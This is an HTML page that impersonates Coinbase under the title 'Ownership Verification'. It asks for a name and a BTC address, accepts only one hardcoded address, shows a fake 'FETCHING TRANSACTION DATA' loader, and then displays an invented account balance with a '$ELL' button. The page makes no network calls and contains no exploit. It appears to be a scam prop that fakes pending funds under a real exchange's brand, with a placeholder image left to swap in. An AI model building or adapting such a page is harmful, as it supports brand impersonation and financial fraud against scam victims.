<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>COINBASE-Ownership Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      margin: 0; 
      padding: 0; 
      font-family: 'Segoe UI', Arial, sans-serif; 
      background: #f4f6fa; 
      min-height: 100vh; 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: center;
    }
    .image-container {
      margin-top: 40px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .image-container img {
      max-width: 330px;
      border-radius: 16px;
      box-shadow: 0 4px 24px 0 rgba(44,62,80,0.1);
    }
    .floating-btn {
      position: fixed;
      bottom: 40px;
      right: 40px;
      background: #0052ff;
      color: #fff;
      border: none;
      border-radius: 32px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.13);
      padding: 18px 34px;
      font-size: 1.1rem;
      cursor: pointer;
      z-index: 10;
      transition: background 0.22s;
    }
    .floating-btn:hover {
      background: #0037b3;
    }
    .modal, .dashboard, .loading-section {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      width: 100vw; height: 100vh;
      background: rgba(30,38,50,0.52);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 100;
      transition: opacity 0.25s;
    }
    .modal-content, .dashboard-content, .loading-content {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 6px 32px 0 rgba(44,62,80,0.13);
      padding: 34px 28px 30px;
      width: 95vw;
      max-width: 380px;
      box-sizing: border-box;
      text-align: center;
    }
    .country-flag {
      font-size: 2.2rem;
      margin-bottom: 12px;
    }
    .form-field {
      margin: 1.2em 0;
      text-align: left;
    }
    .form-label {
      font-weight: 500;
      margin-bottom: 4px;
      display: block;
    }
    .form-input {
      width: 100%;
      padding: 10px 11px;
      font-size: 1rem;
      border-radius: 7px;
      border: 1px solid #d2d6df;
      margin-bottom: 3px;
      box-sizing: border-box;
      outline: none;
      transition: border 0.18s;
    }
    .form-input:focus {
      border: 1.5px solid #0052ff;
    }
    .pending-btn {
      margin-top: 10px;
      width: 100%;
      background: #0052ff;
      color: #fff;
      font-size: 1rem;
      border: none;
      border-radius: 7px;
      padding: 13px 0;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.19s;
    }
    .pending-btn:hover {
      background: #0037b3;
    }
    .error-message {
      color: #e74c3c;
      margin-bottom: 10px;
      font-size: 0.96em;
    }
    /* Loading Spinner Styles */
    .loading-spinner {
      margin: 0 auto 20px;
      position: relative;
      width: 64px;
      height: 64px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .coinbase-logo {
      width: 40px; height: 40px;
      background: #fff;
      border-radius: 50%;
      border: 4px solid #0052ff;
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      left: 12px;
      top: 12px;
    }
    .coinbase-logo svg {
      width: 24px;
      height: 24px;
    }
    .spinner-ring {
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      width: 100%; height: 100%;
      border: 5px solid #c4dafc;
      border-top: 5px solid #0052ff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      z-index: 2;
    }
    @keyframes spin {
      100% { transform: rotate(360deg);}
    }
    .loading-caption {
      font-size: 1.12em;
      color: #212c38;
      margin-top: 18px;
      font-weight: 500;
      letter-spacing: 1px;
    }
    /* Dashboard Styles */
    .dashboard-balance {
      font-size: 2.1rem;
      color: #0052ff;
      font-weight: 700;
      margin-bottom: 16px;
      margin-top: 18px;
    }
    .dashboard-btn {
      margin-top: 16px;
      width: 100%;
      background: #22b573;
      color: #fff;
      font-size: 1.09rem;
      border: none;
      border-radius: 8px;
      padding: 15px 0;
      cursor: pointer;
      font-weight: 600;
      transition: background 0.18s;
    }
    .dashboard-btn:hover {
      background: #188a53;
    }
    @media (max-width: 599px) {
      .floating-btn { bottom: 22px; right: 14px; padding: 13px 20px; font-size: 1rem;}
      .modal-content, .dashboard-content, .loading-content { max-width: 97vw; padding: 18px 5vw 18px;}
    }
  </style>
</head>
<body>
  <div class="image-container">
    <!-- Replace src with your uploaded image file (e.g., image1.jpg) -->
    <img id="main-image" src="YOUR_IMAGE_HERE.jpg" alt="Ownership Verification" />
  </div>

  <button class="floating-btn" id="dashboardBtn">Go to Dashboard</button>

  <!-- Modal for Country, Name & BTC Address -->
  <div class="modal" id="modal" style="display: none;">
    <div class="modal-content">
      <div class="country-flag">ðŸ‡ºðŸ‡¸</div>
      <div style="font-weight:600;font-size:1.18em;margin-bottom:11px;">Confirm your country</div>
      <div style="color: #767676; font-size: 1em; margin-bottom:17px;">United States</div>
      <form id="ownershipForm" autocomplete="off">
        <div class="form-field">
          <label class="form-label" for="fullName">Full Name</label>
          <input class="form-input" id="fullName" name="fullName" type="text" required placeholder="Enter your full name" />
        </div>
        <div class="form-field">
          <label class="form-label" for="btcAddress">BTC Address</label>
          <input class="form-input" id="btcAddress" name="btcAddress" type="text" required placeholder="Enter your BTC Address" />
        </div>
        <div id="errorMsg" class="error-message" style="display: none;"></div>
        <button type="submit" class="pending-btn">Retrieve Pending Transaction</button>
      </form>
    </div>
  </div>

  <!-- Loading Section -->
  <div class="loading-section" id="loadingSection" style="display:none;">
    <div class="loading-content">
      <div class="loading-spinner">
        <div class="spinner-ring"></div>
        <div class="coinbase-logo">
          <!-- Coinbase Logo SVG -->
          <svg viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="12" r="12" fill="#0052ff"/>
            <rect x="7" y="11" width="10" height="2" rx="1" fill="#fff"/>
          </svg>
        </div>
      </div>
      <div class="loading-caption">FETCHING TRANSACTION DATA</div>
    </div>
  </div>

  <!-- Dashboard Section -->
  <div class="dashboard" id="dashboard" style="display:none;">
    <div class="dashboard-content">
      <div style="font-size:1.25em;font-weight:600;margin-bottom:10px;">Dashboard</div>
      <div class="dashboard-balance">$25,6042.90</div>
      <button class="dashboard-btn" id="sellBtn">$ELL</button>
    </div>
  </div>

  <script>
    // Show Modal on Dashboard Button Click
    document.getElementById('dashboardBtn').onclick = function() {
      document.getElementById('modal').style.display = 'flex';
    };

    // Ownership Form Handling
    document.getElementById('ownershipForm').onsubmit = function(e) {
      e.preventDefault();
      var name = document.getElementById('fullName').value.trim();
      var btc = document.getElementById('btcAddress').value.trim();
      var errorMsg = document.getElementById('errorMsg');
      if (!name || !btc) {
        errorMsg.textContent = "Please fill in all fields.";
        errorMsg.style.display = "block";
        return false;
      }
      if (btc !== "3ChUNE...6rPUxd") {
        errorMsg.textContent = "BTC address does not match the supported address for verification.";
        errorMsg.style.display = "block";
        return false;
      }
      errorMsg.style.display = "none";
      document.getElementById('modal').style.display = 'none';
      document.getElementById('loadingSection').style.display = 'flex';
      // Loading animation (4 seconds)
      setTimeout(function() {
        document.getElementById('loadingSection').style.display = 'none';
        document.getElementById('dashboard').style.display = 'flex';
      }, 4000);
      return false;
    };

    // Optional: Hide Modal if clicked outside the content
    document.getElementById('modal').addEventListener('click', function(e) {
      if (e.target === this) this.style.display = 'none';
    });
  </script>
</body>
</html>
